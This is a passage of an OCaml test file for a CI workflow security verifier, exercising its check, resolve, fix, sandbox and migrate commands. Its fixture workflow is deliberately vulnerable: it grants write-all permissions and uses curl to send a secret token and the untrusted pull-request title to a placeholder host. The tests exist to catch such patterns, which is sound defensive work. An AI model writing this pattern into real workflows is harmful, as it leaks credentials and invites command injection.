type test = string * (unit -> unit)

exception Failed of string

let fail format = Printf.ksprintf (fun value -> raise (Failed value)) format
let expect message condition = if not condition then fail "%s" message

let lockfile entries =
  match Lockfile.create entries with
  | Ok lock -> lock
  | Error message -> fail "%s" message

type harness = {
  mutable files : (string * string) list;
  mutable stdout : string list;
  mutable stderr : string list;
  mutable writes : int;
  mutable network_calls : int;
  mutable resolver_allowed_sources : string list list;
  mutable executions : int;
  mutable snapshot_replacement : (string * string) option;
}

let vulnerable_workflow =
  "name: ci\n" ^ "on:\n  pull_request:\n" ^ "permissions: write-all\n"
  ^ "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n"
  ^ "      - uses: actions/checkout@v4\n"
  ^ "      - run: curl -d \"${{ secrets.TOKEN }}:${{ \
     github.event.pull_request.title }}\" https://example.invalid\n"

let harness () =
  {
    files = [ (".github/workflows/ci.yml", vulnerable_workflow) ];
    stdout = [];
    stderr = [];
    writes = 0;
    network_calls = 0;
    resolver_allowed_sources = [];
    executions = 0;
    snapshot_replacement = None;
  }

let io state =
  {
    Cli.cwd = (fun () -> ".");
    today = (fun () -> "2026-08-25");
    user_cache_dir = (fun () -> Some "user-cache");
    read_file =
      (fun path ->
        match List.assoc_opt (Util.normalize_slashes path) state.files with
        | Some value -> Ok value
        | None -> Error ("missing " ^ path));
    write_file =
      (fun path contents ->
        state.writes <- state.writes + 1;
        state.files <-
          (Util.normalize_slashes path, contents)
          :: List.remove_assoc (Util.normalize_slashes path) state.files;
        Ok ());
    remove_file =
      (fun path ->
        state.files <-
          List.remove_assoc (Util.normalize_slashes path) state.files;
        Ok ());
    exists =
      (fun path ->
        List.mem_assoc (Util.normalize_slashes path) state.files || path = ".");
    is_directory =
      (fun path -> path = "." || path = "base" || path = "head" || path = "src");
    list_files =
      (fun root ->
        state.files |> List.map fst
        |> List.filter (fun path ->
            root = "." || Util.starts_with ~prefix:(root ^ "/") path));
    snapshot =
      (fun ~trusted_exclusions root ->
        Option.iter
          (fun (path, contents) ->
            state.files <-
              (path, contents) :: List.remove_assoc path state.files)
          state.snapshot_replacement;
        state.snapshot_replacement <- None;
        let files =
          state.files
          |> List.filter (fun (path, _) ->
              (root = "." || Util.starts_with ~prefix:(root ^ "/") path)
              && not (Util.starts_with ~prefix:"user-cache/" path))
        in
        let sources =
          List.map
            (fun (path, contents) ->
              ( path,
                Source_manifest.Regular_source
                  { contents; executable = false; identity = None } ))
            files
        in
        match
          Source_manifest.create_from_sources
            ~budget:Source_manifest.default_budget ~trusted_exclusions ~root
            ~files:sources
        with
        | Error _ as error -> error
        | Ok manifest ->
            let included =
              files
              |> List.filter (fun (path, _) ->
                  not
                    (Source_manifest.is_excluded ~root ~trusted_exclusions path))
            in
            Ok { Cli.manifest; files = included });
    binary_digest = (fun () -> "sha256:" ^ String.make 64 'b');
    source_commit = (fun () -> Some (String.make 40 'c'));
    stdout = (fun text -> state.stdout <- text :: state.stdout);
    stderr = (fun text -> state.stderr <- text :: state.stderr);
  }

let services state =
  {
    Cli.resolver_network =
      Some
        (fun ~allowed_sources ->
          state.resolver_allowed_sources <-
            allowed_sources :: state.resolver_allowed_sources;
          {
            Resolver.fetch =
              (fun dependency ->
                let reference = dependency.Frontend_intf.reference in
                state.network_calls <- state.network_calls + 1;
                Ok
                  {
                    revision = String.make 40 'e';
                    content = "resolved " ^ reference;
                    source = "https://example.invalid/" ^ reference;
                    semantic_source = None;
                  });
          });
    sandbox_execute =
      Some
        (fun ~source_root:_ plan ->
          state.executions <- state.executions + 1;
          Ok
            {
              Sandbox_run.evidence =
                Evidence.empty ~plan_digest:plan.Sandbox_protocol.digest;
              outcome = Completed;
            });
    platform = "test";
    backend_probes = [];
    backend_inventory = [];
  }

let output values = List.rev values |> String.concat ""

let complete_evidence (plan : Sandbox_protocol.plan) =
  let evidence =
    Evidence.for_plan plan
    |> Evidence.append
         (Evidence.Backend_attested
            {
              id = Sandbox_protocol.backend_name plan.backend;
              version = "test";
              platform = "test";
              controls_digest = Sandbox_protocol.controls_digest plan.controls;
            })
  in
  let evidence =
    List.fold_left
      (fun current control ->
        Evidence.append
          (Evidence.Control_attested (Sandbox_protocol.control_name control))
          current)
      evidence plan.controls
  in
  let evidence =
    List.fold_left
      (fun current (step : Sandbox_protocol.step) ->
        match step.argv with
        | executable :: argv ->
            current
            |> Evidence.append (Evidence.Process_started { executable; argv })
            |> Evidence.append (Evidence.Process_exited { code = 0 })
        | [] -> current)
      evidence plan.steps
  in
  evidence
  |> Evidence.append
       (Evidence.Resource_observed
          {
            wall_time_ms = 0;
            cpu_time_ms = 0;
            peak_memory_bytes = 0L;
            processes = List.length plan.steps;
            output_bytes = 0;
            scratch_bytes = 0L;
            scratch_entries = 0;
          })
  |> Evidence.append
       (Evidence.Log_recorded { digest = "sha256:" ^ Sha256.digest_string "" })
  |> Evidence.append (Evidence.Filesystem_final { digest = plan.source_digest })

let help_surface_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "--help" |]
  in
  expect "help succeeds" (code = 0);
  let text = output state.stdout in
  List.iter
    (fun command ->
      expect ("help omits " ^ command) (Util.contains ~needle:command text))
    [
      "check";
      "resolve";
      "explain";
      "graph";
      "diff";
      "fix";
      "policy";
      "sandbox";
      "doctor";
      "completion";
      "migrate";
    ];
  let default_state = harness () in
  let default_code =
    Cli.run ~io:(io default_state) ~services:(services default_state)
      [| "workflow-verifier" |]
  in
  expect "the empty command returns buffered help without a pager"
    (default_code = 0
    && Util.contains ~needle:"workflow-verifier" (output default_state.stdout))

let subcommand_help_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "check"; "--help" |]
  in
  expect "check help succeeds" (code = 0);
  expect "check help has its own synopsis"
    (Util.contains ~needle:"workflow-verifier check [OPTION]"
       (output state.stdout));
  List.iter
    (fun status ->
      expect
        ("check help omits stable exit " ^ status)
        (Util.contains ~needle:(status ^ "   ") (output state.stdout)))
    [ "0"; "1"; "2"; "3"; "4"; "5" ];
  expect "check help does not expose Cmdliner internal exit defaults"
    (not (Util.contains ~needle:"123" (output state.stdout)));
  expect "check help emits no diagnostics" (state.stderr = []);
  expect "check help is read-only" (state.writes = 0);
  expect "check help does not resolve" (state.network_calls = 0);
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "plan"; "--help" |]
  in
  expect "nested sandbox help succeeds" (code = 0);
  expect "nested sandbox help has its own synopsis"
    (Util.contains ~needle:"workflow-verifier sandbox plan"
       (output state.stdout));
  expect "nested sandbox help does not execute" (state.executions = 0)

let strict_argument_parser_test () =
  let cases =
    [
      ( "unknown option",
        [| "workflow-verifier"; "check"; "--definitely-unknown"; "." |],
        "unknown option" );
      ( "missing option value",
        [| "workflow-verifier"; "check"; "--format" |],
        "needs an argument" );
      ( "duplicate singleton option",
        [|
          "workflow-verifier";
          "check";
          "--format";
          "json";
          "--format";
          "text";
          ".";
        |],
        "cannot be repeated" );
      ( "invalid enum",
        [| "workflow-verifier"; "check"; "--format"; "xml"; "." |],
        "invalid value" );
      ( "extra positional argument",
        [| "workflow-verifier"; "check"; "."; "extra" |],
        "too many arguments" );
    ]
  in
  List.iter
    (fun (name, arguments, cause) ->
      let state = harness () in
      let code = Cli.run ~io:(io state) ~services:(services state) arguments in
      let error = output state.stderr in
      expect
        (name ^ " exits 2 before effects")
        (code = 2 && state.writes = 0 && state.network_calls = 0
       && state.executions = 0);
      expect
        (name ^ " explains cause, correction, and documentation")
        (Util.contains ~needle:cause error
        && Util.contains ~needle:"hint:" error
        && Util.contains
             ~needle:"https://workflow-verifier.dev/docs/cli-v0.1#input-errors"
             error))
    cases;
  let repeated = harness () in
  let repeated_code =
    Cli.run ~io:(io repeated) ~services:(services repeated)
      [|
        "workflow-verifier";
        "sandbox";
        "plan";
        "--job";
        "build";
        "--secret";
        "FIRST";
        "--secret";
        "SECOND";
        ".";
      |]
  in
  let plan = output repeated.stdout in
  expect "declared repeatable secret names are retained"
    (repeated_code = 0
    && Util.contains ~needle:"FIRST" plan
    && Util.contains ~needle:"SECOND" plan)

let check_contract_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "check"; "--format"; "json"; "." |]
  in
  expect "gate exits 1 for high confidence findings" (code = 1);
  let report = output state.stdout in
  expect "check emits report-v2"
    (Util.contains ~needle:"\"schema\":\"report-v2\"" report);
  expect "check is read only" (state.writes = 0);
  expect "check is offline" (state.network_calls = 0);
  expect "check never executes workflow code" (state.executions = 0);
  let audit = harness () in
  let audit_code =
    Cli.run ~io:(io audit) ~services:(services audit)
      [| "workflow-verifier"; "check"; "--persona"; "audit"; "." |]
  in
  expect "audit reports without gating" (audit_code = 0)

let discovery_boundary_test () =
  let state = harness () in
  state.files <-
    ("_build/default/.github/workflows/copied.yml", vulnerable_workflow)
    :: ("helpers/target/debug/.github/workflows/copied.yml", vulnerable_workflow)
    :: ( "evaluation/corpus/github/example/.github/workflows/copied.yml",
         vulnerable_workflow )
    :: ("test/fixtures/.github/workflows/intentional.yml", vulnerable_workflow)
    :: ("test/fixtures/.gitlab-ci.yml", "verify:\n  script: echo fixture\n")
    :: ("test/fixtures/azure-pipelines.yml", "trigger: [main]\npool: hosted\n")
    :: ("test/fixtures/.circleci/config.yml", "version: 2.1\nworkflows: {}\n")
    :: state.files;
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--persona";
        "audit";
        "--format";
        "json";
        ".";
      |]
  in
  expect "audit succeeds" (code = 0);
  let discovery_report = output state.stdout in
  if not (Util.contains ~needle:"\"inputs\":1" discovery_report) then
    fail "nested provider-shaped files became repository entrypoints: %s"
      discovery_report;
  let system_paths = harness () in
  system_paths.files <-
    List.map (fun (path, source) -> ("./" ^ path, source)) system_paths.files;
  let system_path_code =
    Cli.run ~io:(io system_paths) ~services:(services system_paths)
      [| "workflow-verifier"; "check"; "--persona"; "audit"; "." |]
  in
  expect "filesystem paths prefixed by the current directory are entrypoints"
    (system_path_code = 0);
  let filtered = harness () in
  filtered.files <-
    ( ".workflow-verifier.toml",
      "version = 2\n\
       persona = \"audit\"\n\
       frontends = [\"gitlab\"]\n\
       offline = true\n" )
    :: filtered.files;
  let filtered_code =
    Cli.run ~io:(io filtered) ~services:(services filtered)
      [| "workflow-verifier"; "check"; "." |]
  in
  expect "repository config cannot weaken persona or disable frontends"
    (filtered_code = 2)

let trusted_source_exclusion_test () =
  let policy =
    "version = 2\npersona = \"audit\"\n"
    ^ "source_exclusions = [\".github/workflows/ignored.yml\"]\n"
  in
  let trusted = harness () in
  trusted.files <-
    (".workflow-verifier.toml", policy)
    :: (".github/workflows/ignored.yml", vulnerable_workflow)
    :: trusted.files;
  let code =
    Cli.run ~io:(io trusted) ~services:(services trusted)
      [|
        "workflow-verifier";
        "check";
        "--trust-repository-config";
        "--format";
        "json";
        ".";
      |]
  in
  expect "trusted policy source exclusions are applied before traversal"
    (code = 0 && Util.contains ~needle:"\"inputs\":1" (output trusted.stdout));
  let untrusted = harness () in
  untrusted.files <-
    (".workflow-verifier.toml", policy)
    :: (".github/workflows/ignored.yml", vulnerable_workflow)
    :: untrusted.files;
  let untrusted_code =
    Cli.run ~io:(io untrusted) ~services:(services untrusted)
      [| "workflow-verifier"; "check"; "." |]
  in
  expect "repository config cannot silently remove source evidence"
    (untrusted_code = 2
    && Util.contains ~needle:"cannot exclude source paths"
         (output untrusted.stderr));
  let changed = harness () in
  changed.files <- (".workflow-verifier.toml", policy) :: changed.files;
  changed.snapshot_replacement <-
    Some (".workflow-verifier.toml", "version = 2\npersona = \"gate\"\n");
  let changed_code =
    Cli.run ~io:(io changed) ~services:(services changed)
      [| "workflow-verifier"; "check"; "--trust-repository-config"; "." |]
  in
  expect "config bytes are rebound to and rechecked against the source snapshot"
    (changed_code = 2
    && Util.contains ~needle:"configuration changed" (output changed.stderr))

let explicit_effects_test () =
  let offline = harness () in
  ignore
    (Cli.run ~io:(io offline) ~services:(services offline)
       [| "workflow-verifier"; "resolve"; "." |]);
  expect "resolve without network opt-in is offline" (offline.network_calls = 0);
  let online = harness () in
  online.files <-
    ( ".workflow-verifier.toml",
      "version = 2\n\
       [resolver]\n\
       require_immutable = true\n\
       [[resolver.allowed_origins]]\n\
       origin = \"https://example.invalid\"\n\
       path_prefixes = [\"/\"]\n" )
    :: online.files;
  ignore
    (Cli.run ~io:(io online) ~services:(services online)
       [|
         "workflow-verifier";
         "resolve";
         "--allow-network";
         "--trust-repository-config";
         ".";
       |]);
  expect "allow-network enables resolver adapter" (online.network_calls > 0);
  expect "resolver adapter receives the configured pre-fetch allowlist"
    (online.resolver_allowed_sources = [ [ "https://example.invalid/" ] ]);
  expect "resolve writes only its lockfile" (online.writes = 1);

  let dry = harness () in
  ignore
    (Cli.run ~io:(io dry) ~services:(services dry)
       [| "workflow-verifier"; "fix"; "." |]);
  expect "fix is dry-run by default" (dry.writes = 0);
  expect "fix dry-run emits a source diff"
    (Util.contains ~needle:"--- " (output dry.stdout)
    || Util.contains ~needle:"no behavior-preserving fixes" (output dry.stdout)
    );
  let pinned = harness () in
  let lock =
    lockfile
      [
        {
          Lockfile.provider = Ir.Github;
          reference = "actions/checkout@v4";
          revision = String.make 40 'a';
          digest = "sha256:" ^ String.make 64 'b';
          source = "https://github.com/actions/checkout";
          summary = None;
        };
      ]
  in
  pinned.files <-
    ("workflow-verifier.lock", Lockfile.to_canonical_json lock) :: pinned.files;
  ignore
    (Cli.run ~io:(io pinned) ~services:(services pinned)
       [| "workflow-verifier"; "fix"; "." |]);
  expect "available fixes render a unified diff without writing"
    (pinned.writes = 0
    && Util.contains ~needle:"--- .github/workflows/ci.yml"
         (output pinned.stdout));

  let plan_only = harness () in
  ignore
    (Cli.run ~io:(io plan_only) ~services:(services plan_only)
       [| "workflow-verifier"; "sandbox"; "plan"; "--job"; "build"; "." |]);
  expect "sandbox plan does not execute" (plan_only.executions = 0)

let strict_and_error_codes_test () =
  let strict = harness () in
  let code =
    Cli.run ~io:(io strict) ~services:(services strict)
      [| "workflow-verifier"; "check"; "--strict"; "--persona"; "audit"; "." |]
  in
  expect "strict incomplete has exit 3" (code = 3);
  let invalid = harness () in
  let invalid_code =
    Cli.run ~io:(io invalid) ~services:(services invalid)
      [| "workflow-verifier"; "unknown-command" |]
  in
  expect "bad command has exit 2" (invalid_code = 2);
  let no_executor = harness () in
  let no_services =
    { (services no_executor) with Cli.sandbox_execute = None }
  in
  let infrastructure =
    Cli.run ~io:(io no_executor) ~services:no_services
      [| "workflow-verifier"; "sandbox"; "run"; "--job"; "build"; "." |]
  in
  expect "missing sandbox infrastructure has exit 5" (infrastructure = 5)

let explain_graph_doctor_test () =
  let explain = harness () in
  ignore
    (Cli.run ~io:(io explain) ~services:(services explain)
       [| "workflow-verifier"; "explain"; "WV-SEC-001"; "." |]);
  expect "explain contains trace and capability"
    (Util.contains ~needle:"trace"
       (String.lowercase_ascii (output explain.stdout))
    && Util.contains ~needle:"shell"
         (String.lowercase_ascii (output explain.stdout)));
  let graph_state = harness () in
  ignore
    (Cli.run ~io:(io graph_state) ~services:(services graph_state)
       [| "workflow-verifier"; "graph"; "--format"; "dot"; "." |]);
  expect "graph command emits DOT"
    (Util.starts_with ~prefix:"digraph workflow" (output graph_state.stdout));
  let doctor = harness () in
  let code =
    Cli.run ~io:(io doctor) ~services:(services doctor)
      [| "workflow-verifier"; "doctor"; "--format"; "json" |]
  in
  expect "doctor succeeds without side effects" (code = 0 && doctor.writes = 0);
  expect "doctor returns machine-readable controls"
    (Util.contains ~needle:"frontends" (output doctor.stdout)
    && Util.contains ~needle:"\"schema\":\"doctor-v2\"" (output doctor.stdout))

let sandbox_replay_audit_test () =
  let state = harness () in
  let replay_step : Sandbox_protocol.step =
    {
      id = "replay";
      image = "sha256:" ^ String.make 64 'a';
      argv = [ "/bin/sh"; "-c"; "true" ];
      environment = [];
      working_directory = "/workspace";
      supported = true;
    }
  in
  let plan =
    match
      Sandbox_protocol.make_scenario_plan ~backend:(Oci "docker")
        ~scenario_digest:("sha256:" ^ String.make 64 '9')
        ~provider_profile:"github-semantic-v1" ~selected_jobs:[ "build" ]
        ~runner_platform:"linux-x86_64"
        ~source_digest:("sha256:" ^ String.make 64 '1')
        ~lock_digest:("sha256:" ^ String.make 64 '2')
        ~controls:[ Network_deny ]
        ~limits:
          {
            cpu_seconds = 900;
            memory_mb = 2048;
            processes = 128;
            output_bytes = 16 * 1024 * 1024;
          }
        ~network_destinations:[] ~secret_names:[] ~dependencies:[]
        ~steps:[ replay_step ] ~incomplete_reasons:[]
    with
    | Ok value -> value
    | Error message -> fail "%s" message
  in
  let evidence = complete_evidence plan in
  state.files <-
    ("plan.json", Sandbox_protocol.to_canonical_json plan)
    :: ("evidence.json", Evidence.to_canonical_json evidence)
    :: state.files;
  let replay_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "sandbox"; "replay"; "evidence.json" |]
  in
  expect "sandbox replay authenticates persisted evidence" (replay_code = 0);
  expect "sandbox replay emits canonical evidence"
    (Util.contains ~needle:"\"schema\":\"evidence-v2\"" (output state.stdout));
  state.stdout <- [];
  let audit_code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier"; "sandbox"; "audit"; "plan.json"; "evidence.json";
      |]
  in
  if audit_code <> 0 then
    fail "sandbox audit rejected complete evidence (code %d): %s" audit_code
      (output state.stderr);
  expect "sandbox audit is machine readable"
    (Util.contains ~needle:"\"schema\":\"sandbox-audit-v1\""
       (output state.stdout))

let policy_fixture_test () =
  let state = harness () in
  state.files <-
    [
      ( ".workflow-verifier.toml",
        "version = 2\n\
         [[rules]]\n\
         id = \"ORG-NET\"\n\
         kind = \"forbid\"\n\
         selector.effect = \"network\"\n\
         message = \"network denied\"\n" );
      ( ".github/workflows/case.yml",
        "name: fixture\n\
         on: push\n\
         jobs:\n\
        \  check:\n\
        \    runs-on: ubuntu-latest\n\
        \    steps:\n\
        \      - run: curl https://example.invalid\n" );
      ( ".github/workflows/case.yml.expect.json",
        "{\"expected_rules\":[\"ORG-NET\"],\"schema\":\"policy-fixture-v1\"}\n"
      );
    ];
  let passing =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "policy"; "test"; "." |]
  in
  expect "policy fixtures execute the compiled workflow" (passing = 0);
  expect "policy fixture output reports the case"
    (Util.contains ~needle:"case.yml" (output state.stdout));
  state.stdout <- [];
  state.files <-
    ( ".github/workflows/case.yml.expect.json",
      "{\"expected_rules\":[],\"schema\":\"policy-fixture-v1\"}\n" )
    :: List.remove_assoc ".github/workflows/case.yml.expect.json" state.files;
  let failing =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "policy"; "test"; "." |]
  in
  expect "unexpected policy diagnostics fail the fixture gate" (failing = 1)

let incremental_cache_cli_test () =
  let state = harness () in
  let first =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--format";
        "json";
        "--cache-mode";
        "user";
        ".";
      |]
  in
  expect "cache write retains the finding exit code" (first = 1);
  expect "cache is written only by explicit opt-in" (state.writes = 1);
  expect "cache envelope is content addressed"
    (match
       state.files
       |> List.find_opt (fun (path, _) ->
           Util.starts_with ~prefix:"user-cache/workflow-verifier/" path)
     with
    | Some (_, source) -> Util.contains ~needle:"analysis-cache-v1" source
    | None -> false);
  let first_output = output state.stdout in
  state.stdout <- [];
  state.writes <- 0;
  let warm =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--format";
        "json";
        "--cache-mode";
        "user";
        ".";
      |]
  in
  expect "cache never replaces fresh analysis output or exit status"
    (warm = first && output state.stdout = first_output);
  expect "freshly verified results may refresh only the user cache"
    (state.writes = 1)

let sandbox_source_manifest_test () =
  let plan_digest files =
    let state = harness () in
    state.files <- files @ state.files;
    let code =
      Cli.run ~io:(io state) ~services:(services state)
        [| "workflow-verifier"; "sandbox"; "plan"; "--job"; "build"; "." |]
    in
    expect "sandbox plan succeeds" (code = 0);
    match Sandbox_protocol.parse (output state.stdout) with
    | Ok plan -> plan.source_digest
    | Error message -> fail "sandbox plan is not parseable: %s" message
  in
  let first = plan_digest [ ("README.md", "first\n") ] in
  let changed = plan_digest [ ("README.md", "second\n") ] in
  let ignored =
    plan_digest
      [
        ("README.md", "first\n"); ("_build/default/generated.txt", "volatile\n");
      ]
  in
  let corpus_ignored =
    plan_digest
      [
        ("README.md", "first\n");
        ("evaluation/corpus/github/example/README.txt", "corpus evidence\n");
      ]
  in
  expect "every mounted source file contributes to the source digest"
    (first <> changed);
  expect
    "build trees are not silently excluded from the mounted source manifest"
    (first <> ignored);
  expect "evaluation trees are not silently excluded from the source manifest"
    (first <> corpus_ignored)

let sandbox_reconciliation_cli_test () =
  let state = harness () in
  state.files <-
    [
      ( "src/.github/workflows/ci.yml",
        "name: reconcile\n\
         on: push\n\
         jobs:\n\
        \  build:\n\
        \    runs-on: ubuntu-latest\n\
        \    steps:\n\
        \      - run: echo ok\n" );
      ( "src/.workflow-verifier.toml",
        "version = 2\n\
         persona = \"audit\"\n\
         frontends = [\"github\"]\n\
         offline = true\n\
         [sandbox]\n\
         backend = \"oci:docker\"\n\
         capsule_digest = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let plan_code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "sandbox";
        "plan";
        "--job";
        "build";
        "--trust-repository-config";
        "src";
      |]
  in
  expect "reconciliation fixture plan succeeds" (plan_code = 0);
  let plan_source = output state.stdout in
  let plan =
    match Sandbox_protocol.parse plan_source with
    | Ok value -> value
    | Error message -> fail "%s" message
  in
  let evidence = complete_evidence plan in
  state.files <-
    ("plan.json", plan_source)
    :: ("evidence.json", Evidence.to_canonical_json evidence)
    :: state.files;
  state.stdout <- [];
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "sandbox";
        "audit";
        "--trust-repository-config";
        "plan.json";
        "evidence.json";
        "src";
      |]
  in
  if code <> 0 then
    fail "static/runtime reconciliation failed (code %d): %s" code
      (output state.stderr);
  let audit_output = output state.stdout in
  if
    not
      (Util.contains ~needle:"\"id\":\"WV-RUNTIME-001\"" audit_output
      && Util.contains ~needle:"\"state\":\"Proved\"" audit_output)
  then fail "unexpected reconciliation output: %s" audit_output

let macos_vm_control_contract_test () =
  let state = harness () in
  state.files <-
    [
      ( "src/.github/workflows/ci.yml",
        "name: vm\n\
         on: push\n\
         jobs:\n\
        \  build:\n\
        \    runs-on: macos-latest\n\
        \    steps:\n\
        \      - run: echo isolated\n" );
      ( "src/.workflow-verifier.toml",
        "version = 2\n\
         persona = \"audit\"\n\
         frontends = [\"github\"]\n\
         offline = true\n\
         [sandbox]\n\
         backend = \"macos-vm\"\n\
         capsule_digest = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "sandbox";
        "plan";
        "--job";
        "build";
        "--trust-repository-config";
        "src";
      |]
  in
  expect "macOS VM plan succeeds" (code = 0);
  let plan = output state.stdout in
  expect "macOS VM requires the VM boundary"
    (Util.contains ~needle:"virtual_machine" plan);
  expect "macOS VM does not require an unrelated App Sandbox boundary"
    (not (Util.contains ~needle:"app_sandbox" plan))

let file_target_lock_path_contract_test () =
  let state = harness () in
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "resolve";
        "--allow-network";
        ".github/workflows/ci.yml";
      |]
  in
  expect "file-target resolution succeeds" (code = 0);
  expect "the default lockfile is adjacent to the target file"
    (List.mem_assoc ".github/workflows/workflow-verifier.lock" state.files);
  expect "the workflow file is never treated as a directory"
    (not
       (List.mem_assoc ".github/workflows/ci.yml/workflow-verifier.lock"
          state.files))

let local_workspace_linking_cli_test () =
  let state = harness () in
  let workflow =
    "name: local\n\
     on: push\n\
     jobs:\n\
    \  build:\n\
    \    runs-on: ubuntu-latest\n\
    \    steps:\n\
    \      - uses: ./actions/build\n"
  and action =
    "name: build\nruns:\n  using: composite\n  steps:\n    - run: echo linked\n"
  and unused =
    "name: unused\n\
     runs:\n\
    \  using: composite\n\
    \  steps:\n\
    \    - run: echo unused\n"
  in
  state.files <-
    [
      (".github/workflows/ci.yml", workflow);
      ("actions/build/action.yml", action);
      ("actions/unused/action.yml", unused);
      ( ".workflow-verifier.toml",
        "version = 2\n\
         persona = \"audit\"\n\
         frontends = [\"github\"]\n\
         offline = true\n\
         [sandbox]\n\
         backend = \"oci:docker\"\n\
         capsule_digest = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "check";
        "--strict";
        "--persona";
        "audit";
        "--trust-repository-config";
        "--format";
        "json";
        ".";
      |]
  in
  if code <> 0 then
    fail
      "exact local action should discharge strict incompleteness (code %d): \
       %s%s"
      code (output state.stderr) (output state.stdout);
  expect
    "only entrypoints and their transitive local units become report inputs"
    (Util.contains ~needle:"\"inputs\":2" (output state.stdout));
  state.stdout <- [];
  let graph_code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "graph";
        "--kind";
        "all";
        "--format";
        "json";
        "--trust-repository-config";
        ".";
      |]
  in
  let linked_graph = output state.stdout in
  expect "whole-program graph contains the local composite command"
    (graph_code = 0
    && Util.contains ~needle:"echo linked" linked_graph
    && Util.contains ~needle:"local-unit" linked_graph);
  state.stdout <- [];
  let plan_code =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "sandbox";
        "plan";
        "--job";
        "build";
        "--trust-repository-config";
        ".";
      |]
  in
  expect "a content-addressed local action yields a complete sandbox plan"
    (plan_code = 0);
  let plan =
    match Sandbox_protocol.parse (output state.stdout) with
    | Ok value -> value
    | Error message -> fail "%s" message
  in
  expect "sandbox consumes local dependency evidence without a lockfile entry"
    (match plan.dependencies with
    | [ dependency ] ->
        dependency.reference = "./actions/build"
        && dependency.available
        && dependency.digest = Some ("sha256:" ^ Sha256.digest_string action)
    | _ -> false);
  match plan.status with
  | Sandbox_protocol.Complete ->
      if
        not
          (List.exists
             (fun (step : Sandbox_protocol.step) ->
               step.supported && List.mem "echo linked" step.argv)
             plan.steps)
      then
        fail "linked composite command missing from plan: %s"
          (Sandbox_protocol.to_canonical_json plan)
  | Incomplete reasons ->
      fail "linked composite plan is incomplete: %s\n%s"
        (String.concat "; " reasons)
        (Sandbox_protocol.to_canonical_json plan ^ linked_graph)

let migration_contract_test () =
  let state = harness () in
  state.files <-
    [
      ( "legacy.toml",
        "version = 1\n\
         persona = \"gate\"\n\
         [[suppressions]]\n\
         rule = \"WV001\"\n\
         path = \".github/workflows/ci.yml\"\n\
         reason = \"tracked exception\"\n\
         [resolver]\n\
         require_immutable = true\n\
         allowed_sources = [\"https://ci.example.test/includes\"]\n\
         [sandbox]\n\
         backend = \"oci:docker\"\n\
         image = \
         \"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n\
         network = \"deny\"\n" );
    ];
  let missing_metadata =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "migrate"; "legacy.toml" |]
  in
  expect "legacy suppressions cannot gain anonymous permanent privilege"
    (missing_metadata = 2
    && Util.contains ~needle:"--suppression-owner" (output state.stderr));
  state.stderr <- [];
  let migrated =
    Cli.run ~io:(io state) ~services:(services state)
      [|
        "workflow-verifier";
        "migrate";
        "--suppression-owner";
        "platform-team";
        "--suppression-expiry";
        "2027-01-31";
        "--output";
        "config-v2.toml";
        "legacy.toml";
      |]
  in
  if migrated <> 0 then
    fail "valid config-v1 migration failed: %s" (output state.stderr);
  let config_source =
    Option.value ~default:"" (List.assoc_opt "config-v2.toml" state.files)
  in
  expect "migration emits version 2"
    (Util.contains ~needle:"version = 2" config_source);
  expect "migration uses typed resolver origins"
    (Util.contains ~needle:"allowed_origins" config_source
    && not (Util.contains ~needle:"allowed_sources" config_source));
  expect "migration binds suppression owner and expiry"
    (Util.contains ~needle:"owner = \"platform-team\"" config_source
    && Util.contains ~needle:"expiry = \"2027-01-31\"" config_source);
  expect "migrated config is accepted by the strict v2 parser"
    (Result.is_ok
       (Config.parse ~today:"2026-08-25" ~trust:Config.Trusted_policy
          config_source));
  let unsigned =
    Json.Object
      [ ("entries", Json.Array []); ("schema", Json.String "lock-v1") ]
  in
  let integrity = "sha256:" ^ Sha256.digest_string (Json.to_string unsigned) in
  let legacy_lock =
    Json.to_string
      (Json.Object
         [
           ("entries", Json.Array []);
           ("integrity", Json.String integrity);
           ("schema", Json.String "lock-v1");
         ])
  in
  state.files <- ("legacy.lock", legacy_lock) :: state.files;
  state.stdout <- [];
  let lock_code =
    Cli.run ~io:(io state) ~services:(services state)
      [| "workflow-verifier"; "migrate"; "legacy.lock" |]
  in
  expect "integrity-checked lock-v1 migrates" (lock_code = 0);
  expect "lock migration emits canonical lock-v2"
    (match Lockfile.parse (output state.stdout) with
    | Ok lock -> lock.schema = "lock-v2"
